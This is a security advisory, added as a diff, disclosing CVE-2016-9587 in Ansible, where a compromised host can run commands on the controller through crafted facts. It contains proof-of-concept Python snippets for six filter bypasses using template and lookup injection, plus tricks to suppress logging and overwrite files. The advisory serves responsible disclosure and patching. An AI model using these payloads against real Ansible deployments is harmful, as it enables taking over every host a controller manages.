@@ -1,0 +1,260 @@
+###########  Computest security advisory CT-2017-0109 #############
+
+            Summary: Command execution on Ansible controller from host
+  Affected software: Ansible
+	        CVE: CVE-2016-9587
+      Reference URL: https://www.computest.nl/advisories/
+                     CT-2017-0109_Ansible.txt
+  Affected versions: < 2.1.4, < 2.2.1
+
+             Credit: Undisclosed at Computest (research@computest.nl)
+Date of publication: January 9, 2017
+
+During a summary code review of Ansible, Computest found and exploited several
+issues that allow a compromised host to execute commands on the Ansible
+controller and thus gain access to the other hosts controlled by that
+controller. 
+
+This was not a full audit and further issues may or may not be present.
+
+About Ansible
+-------------
+"Ansible is an open-source automation engine that automates cloud provisioning,
+configuration management, and application deployment. Once installed on a
+control node, Ansible, which is an agentless architecture, connects to a managed
+node through the default OpenSSH connection type."
+							- wikipedia.org
+													
+Technical Background
+--------------------
+A big threat to a configuration management system like Ansible, Puppet, Salt
+Stack and others, is compromise of the central node. In Ansible terms this is
+called the Controller. If the Controller is compromised, an attacker has
+unfettered access to all hosts that are controlled by the Controller. As such,
+in any deployment, the central node receives extra attention in terms of
+security measures and isolation, and threats to this node are taken even more
+seriously.
+
+Fortunately for team blue, in the case of Ansible the attack surface of the
+Controller is pretty small. Since Ansible is agent-less and based on push, the
+Controller does not expose any services to hosts. 
+
+A very interesting bit of attack surface though is in the Facts. When Ansible
+runs on a host, a JSON object with Facts is returned to the Controller. The
+Controller uses these facts for various housekeeping purposes. Some facts have
+special meaning, like the fact "ansible_python_interpreter" and
+"ansible_connection". The former defines the command to be run when Ansible is
+looking for the python interpreter, and the second determines the host Ansible
+is running against. If an attacker is able to control the first fact he can
+execute an arbitrary command, and if he is able to control the second fact he is
+able to execute on an arbitrary (Ansible-controlled) host. This can be set to
+"local" to execute on the Controller itself.
+
+Because of this scenario, Ansible filters out certain facts when reading the
+facts that a host returns. However, we have found 6 ways to bypass this filter.
+
+In the scenarios below, we will use the following variables:
+
+PAYLOAD = "touch /tmp/foobarbaz"
+
+# Define some ways to execute our payload.
+LOOKUP = "lookup('pipe', '%s')" % PAYLOAD
+INTERPRETER_FACTS = {
+	# Note that it echoes an empty dictionary {} (it's not a format string).
+	'ansible_python_interpreter': '%s; cat > /dev/null; echo {}' % PAYLOAD,
+	'ansible_connection': 'local',
+	# Become is usually enabled on the remote host, but on the Ansible
+	# controller it's likely password protected. Disable it to prevent
+	# password prompts.
+	'ansible_become': False,
+}
+ 
+Bypass #1: Adding a host
+------------------------
+Ansible allows modules to add hosts or update the inventory. This can be very
+useful, for instance when the inventory needs to be retrieved from a IaaS
+platform like as the AWS module does. 
+
+If we're lucky, we can guess the inventory_hostname, in which case the host_vars
+are overwritten [2] and they will be in effect at the next task. If host_name
+doesn't match inventory_hostname, it might get executed in the play for the next
+hostgroup, also depending on the limits set on the commandline.
+
+# (Note that when data["add_host"] is set,
+# data["ansible_facts"] is ignored.)
+data['add_host'] = {
+    # assume that host_name is the same as inventory_hostname
+    'host_name': socket.gethostname(),
+    'host_vars': INTERPRETER_FACTS,
+}
+
+# [1] https://github.com/ansible/ansible/blob/a236cbf3b42fa2c51b89e9395b47abe286775829/lib/ansible/plugins/strategy/__init__.py#L447
+# [2] https://github.com/ansible/ansible/blob/a236cbf3b42fa2c51b89e9395b47abe286775829/lib/ansible/plugins/strategy/__init__.py#L580
+		
+Bypass #2: Conditionals
+-----------------------
+Ansible actions allow for conditionals. If we know the exact contents of a
+"when" clause, and we register it as a fact, a special case checks whether the
+"when" clause matches a variable [1]. In that case it replaces it with its
+contents and evaluates [2] them.
+
+# Known conditionals, separated by newlines
+known_conditionals_str = """
+ansible_os_family == 'Debian'
+ansible_os_family == "Debian"
+ansible_os_family == 'RedHat'
+ansible_os_family == "RedHat"
+ansible_distribution == "CentOS"
+result|failed
+item > 5
+foo is defined
+"""
+known_conditionals = [x.strip() for x in known_conditionals_str.split('\n')]
+for known_conditional in known_conditionals:
+    data['ansible_facts'][known_conditional] = LOOKUP
+	
+[1] https://github.com/ansible/ansible/blob/a236cbf3b42fa2c51b89e9395b47abe286775829/lib/ansible/playbook/conditional.py#L118
+[2] https://github.com/ansible/ansible/blob/a236cbf3b42fa2c51b89e9395b47abe286775829/lib/ansible/playbook/conditional.py#L125
+		
+Bypass #3: Template injection in stat module
+--------------------------------------------
+The template module/action merges its results with those of the stat module.
+This allows us to bypass [1][2][3] the stripping of magic variables from
+ansible_facts [4], because they're at an unexpected location in the result tree.
+
+data.update({
+    'stat': {
+        'exists': True,
+        'isdir': False,
+        'checksum': {
+            'rc': 0,
+            'ansible_facts': INTERPRETER_FACTS,
+        },
+    }
+})
+
+# [1] https://github.com/ansible/ansible/blob/a236cbf3b42fa2c51b89e9395b47abe286775829/lib/ansible/plugins/action/template.py#L39
+# [2] https://github.com/ansible/ansible/blob/a236cbf3b42fa2c51b89e9395b47abe286775829/lib/ansible/plugins/action/template.py#L49
+# [3] https://github.com/ansible/ansible/blob/a236cbf3b42fa2c51b89e9395b47abe286775829/lib/ansible/plugins/action/template.py#L146
+# [4] https://github.com/ansible/ansible/blob/a236cbf3b42fa2c51b89e9395b47abe286775829/lib/ansible/plugins/action/__init__.py#L678
+
+Bypass #4: Template injection by changing jinja syntax
+------------------------------------------------------
+Remote facts always get quoted. Set_fact unquotes them by evaluating them.
+UnsafeProxy was designed to defend against unquoting by transforming jinja
+syntax into jinja comments, effectively disabling injection.
+
+Bypass the filtering of "{{" and "{%" by changing the jinja syntax [1][2]. The
+{{}} is needed to make it look like a variable [3].  This works against:
+- set_fact: foo="{{ansible_os_family}}"
+- command: echo "{{foo}}
+
+data['ansible_facts'].update({
+    'exploit_set_fact': True,
+    'ansible_os_family': "#jinja2:variable_start_string:'[[',variable_end_string:']]',block_start_string:'[%',block_end_string:'%]'\n{{}}\n[[ansible_host]][[lookup('pipe', '" + PAYLOAD  + "')]]",
+})
+
+# [1] https://github.com/ansible/ansible/blob/a236cbf3b42fa2c51b89e9395b47abe286775829/lib/ansible/template/__init__.py#L66
+# [2] https://github.com/ansible/ansible/blob/a236cbf3b42fa2c51b89e9395b47abe286775829/lib/ansible/template/__init__.py#L469
+# [3] https://github.com/ansible/ansible/blob/a236cbf3b42fa2c51b89e9395b47abe286775829/lib/ansible/template/__init__.py#L308
+
+
+Bypass #5: Template injection in dict keys
+------------------------------------------
+Strings and lists are properly cleaned up, but dictionary keys are not [1]. This
+works against:
+- set_fact: foo="some prefix {{ansible_os_family}} and/or suffix"
+- command: echo "{{foo}}
+
+The prefix and/or suffix are needed in order to turn the
+dict into a string, otherwise the value would remain a dict.
+
+data['ansible_facts'].update({
+    'exploit_set_fact': True,
+    'ansible_os_family': { "{{ %s }}" % LOOKUP: ''},
+})
+
+# [1] https://github.com/ansible/ansible/blob/a236cbf3b42fa2c51b89e9395b47abe286775829/lib/ansible/vars/unsafe_proxy.py#L104
+		
+
+Bypass #6: Template injection using safe_eval
+---------------------------------------------
+There's a special case for evaluating strings that look like a list or dict [1].
+Strings that begin with "{" or "[" are evaluated by safe_eval [2]. This allows
+us to bypass the removal of jinja syntax [3]: we use the whitelisted Python to
+re-create a bit of Jinja template that is interpreted.
+
+This works against:
+- set_fact: foo="{{ansible_os_family}}"
+- command: echo "{{foo}}
+
+data['ansible_facts'].update({
+    'exploit_set_fact': True,
+    'ansible_os_family': """[ '{'*2 + "%s" + '}'*2 ]""" % LOOKUP,
+})
+
+# [1] https://github.com/ansible/ansible/blob/a236cbf3b42fa2c51b89e9395b47abe286775829/lib/ansible/template/__init__.py#L334
+# [2] https://github.com/ansible/ansible/blob/a236cbf3b42fa2c51b89e9395b47abe286775829/lib/ansible/template/safe_eval.py
+# [3] https://github.com/ansible/ansible/blob/a236cbf3b42fa2c51b89e9395b47abe286775829/lib/ansible/template/__init__.py#L229
+
+Issue: Disabling verbosity
+--------------------------
+Verbosity can be set on the controller to get more debugging information. This
+verbosity is controlled through a custom fact. A host however can overwrite this
+fact and set the verbosity level to 0, hiding exploitation attempts.
+
+data['_ansible_verbose_override'] = 0
+
+# [1] https://github.com/ansible/ansible/blob/a236cbf3b42fa2c51b89e9395b47abe286775829/lib/ansible/plugins/callback/default.py#L99
+# [2] https://github.com/ansible/ansible/blob/a236cbf3b42fa2c51b89e9395b47abe286775829/lib/ansible/plugins/callback/default.py#L208
+		
+
+Issue: Overwriting files
+------------------------
+Roles usually contain custom facts that are defined in defaults/main.yml,
+intending to be overwritten by the inventory (with group and host vars). These
+facts can be overwritten by the remote host, due to the variable precedence [1].
+Some of these facts may be used to specify the location of a file that will be
+copied to the remote host. The attacker may change it to /etc/passwd. The
+opposite is also true, he may be able to overwrite files on the Controller. One
+example is the usage of a password lookup with where the filename contains a
+variable [2].
+
+[1] http://docs.ansible.com/ansible/playbooks_variables.html#variable-precedence-where-should-i-put-a-variable
+[2] http://docs.ansible.com/ansible/playbooks_lookups.html#the-password-lookup
+
+Mitigation
+----------
+Computest is not aware of mitigations short of installing fixed versions of the
+software.
+
+Resolution
+----------
+Ansible has released new versions that fix the vulnerabilities described in
+this advisory: version 2.1.4 for the 2.1 branch and 2.2.1 for the 2.2 branch.
+
+Conclusion
+----------
+The handling of Facts in Ansible suffers from too many special cases that allow
+for the bypassing of filtering. We found these issues in just hours of code
+review, which can be interpreted as a sign of very poor security. However, we
+don't believe this is the case.
+
+The attack surface of the Controller is very small, as it consists mainly of the
+Facts. We believe that it is very well possible to solve the filtering and
+quoting of Facts in a sound way, and that when this has been done, the
+opportunity for attack in this threat model is very small. 
+
+Furthermore, the Ansible security team has been understanding and professional
+in their communication around this issue, which is a good sign for the handling
+of future issues.
+
+Timeline
+--------
+2016-12-08	First contact with Ansible security team
+2016-12-09	First contact with Redhat security team (secalert@redhat.com)
+2016-12-09	Submitted PoC and description to security@ansible.com
+2016-12-13	Ansible confirms issue and severity
+2016-12-15	Ansible informs us of intent to disclose after holidays
+2017-01-05	Ansible informs us of disclosure date and fix versions
+2017-01-09	Ansible issues fixed version
